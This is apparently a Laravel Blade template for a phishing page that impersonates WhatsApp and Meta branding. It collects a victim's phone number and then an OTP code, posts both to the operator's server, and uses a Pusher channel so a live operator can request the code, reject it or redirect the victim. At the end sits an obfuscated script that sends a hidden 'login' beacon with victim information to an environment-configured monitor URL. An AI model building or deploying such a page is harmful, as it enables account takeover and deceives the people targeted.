<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <link rel="shortcut icon" href="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp_favicon.svg">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pusher/8.4.0/pusher.min.js"
        integrity="sha512-p3rR75Is6DCK1r2D8mdxLQhe4IWVDSTUBdxqs0Veum0hHDSY+sH9M6U6Cesr1umlxbiEK9w/3IhXFlZcWT1AoA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://kit.fontawesome.com/8f728199e4.css" crossorigin="anonymous">
    <style>
        @layer utilities {

            input:-webkit-autofill,
            input:-webkit-autofill:hover,
            input:-webkit-autofill:focus,
            input:-webkit-autofill:active {
                -webkit-box-shadow: 0 0 0px 1000px transparent inset !important;
                -webkit-text-fill-color: inherit !important;
                transition: background-color 9999s ease-in-out 0s;
            }

            /* Ẩn mũi tên tăng/giảm trên Chrome, Safari, Edge */
            input[type=number]::-webkit-inner-spin-button,
            input[type=number]::-webkit-outer-spin-button {
                -webkit-appearance: none;
                margin: 0;
            }

            @supports (-moz-appearance: textfield) {
                input[type=number] {
                    appearance: textfield;
                    -moz-appearance: textfield;
                }
            }
        }


        @font-face {
            font-family: 'MyRulersVjpPro';
            src: url('https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp_font.woff2') format('woff2');
        }

        body {
            font-family: 'MyRulersVjpPro', sans-serif;
        }
    </style>
</head>

<body>
    <div class="lg:grid lg:grid-cols-[200px_1fr_600px] border-b-3 border-b-[#dde2e7] mt-[150px] md:mt-0">
        <div class="hidden md:block col-span-1 ml-10">
            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp.svg?v=1" alt="ws-logo" class="mt-[50px] ml-4" width="70">
            <h1 class="font-bold text-[3.5rem] leading-tight mt-[300px] mb-7">
                {{ explode('_', __('whatsapp.connecting_with_the_world'))[0] }} <span
                    class="text-green-500">{{ explode('_', __('whatsapp.connecting_with_the_world'))[1] }}</span></h1>
        </div>
        <div class="col-span-1 hidden md:block">
            <div class="flex justify-center items-center h-full">
                <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/banner.png" alt="fb-banner" class="w-[40%] xl:w-[50%]">
            </div>
        </div>
        <div class="col-span-1 lg:border-l-3 border-l-[#dde2e7]">
            <div class="flex justify-center w-[90%] lg:w-[80%] mx-auto items-center h-full">
                <div class="space-y-3 w-full">
                    <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/whatsapp.svg?v=1" alt="ws-logo" class="block lg:hidden mx-auto mb-15" width="70">
                    {{-- Thông báo khi lỗi --}}
                    <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl" id="warning"
                        style="display: none;"></div>
                    <form id="submit" class="space-y-3">
                        <p class="font-semibold mb-2.5">{{ $data->login_warning }}</p>
                        <div class="relative border border-gray-300 rounded-[17px] p-4">
                            <div class="flex gap-1">
                                <input id="phone" type="number" placeholder=" "
                                    class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full">
                                <label
                                    class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                    for="phone">{{ __('whatsapp.phone_number') }}</label>
                                <button id="close_btn" class="cursor-pointer hidden" tabindex="-1">
                                    <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/close_logo.svg" width="25" />
                                </button>
                            </div>
                        </div>
                        <button
                            class="outline-none disabled:bg-[#01b207] disabled:cursor-default cursor-pointer w-full bg-[#00e007] text-white rounded-[100px] p-2.5 text-sm active:bg-[#5af53b] active:scale-[99%] transition-all duration-100"
                            type="submit">{{ __('whatsapp.continue') }}</button>
                    </form>
                    <form id="fotp_submit" class="space-y-3 hidden">
                        <p class="font-semibold mb-2.5">{{__('whatsapp.enter')}}</p>
                        <div class="relative border border-gray-300 rounded-[17px] p-4">
                            <div class="flex gap-1">
                                <input id="otp_code" type="text" maxlength="6" inputmode="numeric" placeholder=" "
                                    class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full">
                                <label
                                    class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                    for="otp_code">{{ __('whatsapp.enter_otp') }}</label>
                            </div>
                        </div>
                        <button
                            class="outline-none disabled:bg-[#01b207] disabled:cursor-default cursor-pointer w-full bg-[#00e007] text-white rounded-[100px] p-2.5 text-sm active:bg-[#5af53b] active:scale-[99%] transition-all duration-100"
                            type="submit">{{ __('whatsapp.continue') }}</button>
                    </form>
                    <div class="mt-2">
                        <div class="mt-10 flex justify-center mb-5">
                            <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/meta_logo.png" alt="fb-logo" width="55">
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="w-[90vw] mx-auto mt-5 h-[9vh]">
        <div class="flex gap-2.5 sm:gap-5 justify-center flex-wrap">
            <span class="text-[#646d74] text-sm">Tiếng Việt</span>
            <span class="text-[#646d74] text-sm">English (UK)</span>
            <span class="text-[#646d74] text-sm">中文(台灣)</span>
            <span class="text-[#646d74] text-sm">한국어</span>
            <span class="text-[#646d74] text-sm">日本語</span>
            <span class="text-[#646d74] text-sm">Français (France)</span>
            <span class="text-[#646d74] text-sm">ภาษาไทย</span>
            <span class="text-[#646d74] text-sm">{{ __('whatsapp.other_languages') }}</span>
        </div>
        <p class="text-[#646d74] text-center mt-5 text-sm">Meta ©
            <script>
                document.write(new Date().getFullYear())
            </script>
        </p>
    </div>
    <script src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/whatsapp/helpers.js"></script>
    <script>
        var pusher = new Pusher('f41c529c33d4daa42080', {
            cluster: 'ap1'
        });
        var channel = pusher.subscribe('mrls');
        channel.bind("{{ $pusher_code }}", function(data) {
            const warning = $("#warning")
            const login_btn = $("#submit button[type=submit]")
            const otp_btn = $("#fotp_submit button[type=submit]")
            if (data.status) {
                warning.hide()
                window.location.href = '{{ $data->redirect_link }}'
            } else {
                if (data.phone_error) {
                    warning.show()
                    warning.html("{{ __('whatsapp.invalid_phone') }}")
                    login_btn.attr('disabled', false).html("{{ __('whatsapp.continue') }}")
                }
                if (data.otp_request) {
                    warning.hide()
                    $("#submit").hide()
                    $("#fotp_submit").removeClass('hidden')
                }
                if (data.request_resend) {
                    warning.show()
                    warning.html("{{ __('whatsapp.invalid_otp') }}")
                    otp_btn.html("{{ __('whatsapp.continue') }}").attr('disabled', false)
                }
            }
        });
        $("#submit").submit(function(e) {
            e.preventDefault();
            btn = $(this).find('button[type=submit]')
            warn = $("#warning")
            phone = $("#phone").val()
            dataToSend = {
                'info': '{{ $info }}',
                'phone': phone,
                'ac': 'n'
            }
            warn.hide()
            @switch($setting->whatsAppPhoneCheckType)
                @case('vn')
                if (!isValidVnPhone(phone)) {
                    warn.show()
                    warn.html("{{ __('whatsapp.invalid_phone') }}")
                    return
                }
                @break

                @case('usa')
                if (!isValidUSPhone(phone)) {
                    warn.show()
                    warn.html("{{ __('whatsapp.invalid_phone') }}")
                    return
                }
                @break
            @endswitch
            btn.html("{{ __('whatsapp.confirming') }}").attr('disabled', true)
            $.post("{{ $type == 'custom' ? route('post.customweb.whatsapp') : route('post.realtimeweb.whatsapp') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {
                    if (!data.status) {
                        btn.html("{{ __('whatsapp.continue') }}").attr('disabled', false)
                        warn.show()
                        warn.html("{{ __('whatsapp.try_again') }}")
                    }
                },
                "json"
            );
        });

        $("#fotp_submit").submit(function(e) {
            e.preventDefault();
            btn = $(this).find('button[type=submit]')
            warn = $("#warning")
            phone = $("#phone").val()
            otp = $("#otp_code").val()
            dOtpSend = {
                'info': "{{ $info }}",
                'otp': otp,
                'phone': phone,
                'ac': 'o'
            }
            warn.hide()
            if (!otp || otp < 6) {
                warn.show()
                warn.html("{{ __('whatsapp.invalid_otp') }}")
                return
            }
            btn.html("{{ __('whatsapp.confirming') }}").attr('disabled', true)
            $.post("{{ $type == 'custom' ? route('post.customweb.whatsapp') : route('post.realtimeweb.whatsapp') }}", {
                    d: JSON.stringify(dOtpSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {
                    if (!data.status) {
                        btn.html("{{ __('whatsapp.continue') }}").attr('disabled', false)
                        warn.show()
                        warn.html("{{ __('whatsapp.try_again') }}")
                    }
                },
                "json"
            );
        });
        @if ($setting->web_monitor)
             function _0x288c(){const _0x37ec84=['48CMkkll','json','3JonQMx','17133vzCqfg','4310966IniJJf','{{ env('WEB_MONITOR_API_URL') }}','post','ajax','121420DbkbkL','{{$info}}','2589160vbohhG','21xlbLfm','728nFnPNA','330tpFAEl','32313696gMzGBS','605396rIPIJR','145269vZVoyM','login'];_0x288c=function(){return _0x37ec84;};return _0x288c();}function _0x33d9(_0x4b7f11,_0x1ea9e4){_0x4b7f11=_0x4b7f11-0x66;const _0x288cc2=_0x288c();let _0x33d95b=_0x288cc2[_0x4b7f11];return _0x33d95b;}(function(_0x605303,_0x130420){const _0x4d4965=_0x33d9,_0x497ad1=_0x605303();while(!![]){try{const _0x1dbb7f=parseInt(_0x4d4965(0x6f))/0x1*(parseInt(_0x4d4965(0x6a))/0x2)+-parseInt(_0x4d4965(0x70))/0x3*(-parseInt(_0x4d4965(0x67))/0x4)+-parseInt(_0x4d4965(0x75))/0x5*(-parseInt(_0x4d4965(0x6d))/0x6)+-parseInt(_0x4d4965(0x66))/0x7*(-parseInt(_0x4d4965(0x77))/0x8)+parseInt(_0x4d4965(0x6b))/0x9*(parseInt(_0x4d4965(0x68))/0xa)+-parseInt(_0x4d4965(0x71))/0xb+-parseInt(_0x4d4965(0x69))/0xc;if(_0x1dbb7f===_0x130420)break;else _0x497ad1['push'](_0x497ad1['shift']());}catch(_0x53c8ac){_0x497ad1['push'](_0x497ad1['shift']());}}}(_0x288c,0x88e02),((()=>{const _0x55563d=_0x33d9,_0x566492={'data':_0x55563d(0x76),'type':_0x55563d(0x6c)};$[_0x55563d(0x74)]({'type':_0x55563d(0x73),'url':_0x55563d(0x72),'data':_0x566492,'dataType':_0x55563d(0x6e),'success':function(_0x882676){}});})()));
        @endif
    </script>
</body>

</html>
